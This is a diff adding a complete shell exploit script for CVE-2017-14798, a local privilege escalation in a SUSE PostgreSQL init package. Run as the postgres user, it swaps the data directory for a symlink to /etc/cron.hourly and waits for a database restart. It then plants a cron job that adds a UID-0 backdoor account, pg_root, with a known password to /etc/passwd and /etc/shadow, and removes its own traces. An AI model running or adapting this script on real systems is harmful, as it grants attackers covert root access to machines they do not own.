@@ -1,0 +1,55 @@
+# Exploit Title: PostgreSQL 9.4-0.5.3 - Privilege Escalation
+# Date: 2017-10-11
+# Exploit Author: Johannes Segitz
+# Vendor Homepage: https://bugzilla.suse.com/show_bug.cgi?id=1062722
+# Software Link: -
+# Version: Before postgresql-init-9.4-0.5.3.1
+# Tested on: SUSE Linux Enterprise 11 SP4
+# CVE : CVE-2017-14798
+
+#!/bin/sh
+
+# don't use spaces or other funny characters in here
+CRON_DIR='/etc/cron.hourly'
+CRON_FILE="$CRON_DIR/totally_not_a_lpe"
+
+declare -a CLEANUP_ELEMENTS=('base' 'global' 'pg_clog' 'pg_hba.conf' 'pg_ident.conf' 'pg_multixact' 'pg_subtrans' 'pg_tblspc' 'pg_twophase' 'PG_VERSION' 'pg_xlog' 'postgresql.conf')
+
+if [ "$(whoami)" != "postgres" ]; then
+  echo "Must be run as user postgres"
+  exit -1
+fi
+cd
+
+echo setting up exploit
+mv data data2
+ln -s $CRON_DIR data
+
+echo waiting for DB restart
+while [ ! -w $CRON_DIR ]; do
+  sleep 1 
+done
+
+echo able to write $CRON_DIR
+echo '#!/bin/sh' > $CRON_FILE
+echo 'echo '"'"'pg_root:x:0:0:,,,:/home/pg_root:/bin/bash'"'"' >> /etc/passwd' >> $CRON_FILE
+echo 'echo '"'"'pg_root:$2y$05$6F6hHGfvZ42Mq1EF8V.e8uguGumaZsZ4P9qfjiuHFT/k8B2CZrJaO:16339:0:99999:7:::'"'"' >> /etc/shadow' >> $CRON_FILE
+echo "rm $CRON_FILE" >> $CRON_FILE
+echo "chown root.root ${CRON_DIR}" >> $CRON_FILE
+chmod +x $CRON_FILE
+
+if [ -e $CRON_FILE ]; then
+  echo wrote $CRON_FILE
+else
+  echo failed to write $CRON_FILE, exiting
+  exit 1
+fi
+
+echo cleaning up
+for i in "${CLEANUP_ELEMENTS[@]}"; do
+   rm -rf "$CRON_DIR/$i"
+done
+rm data
+mv data2 data 
+
+echo now wait, depending on CRON_DIR setting you should be able to log into this system with pg_root:foobar soonish. Enjoy!
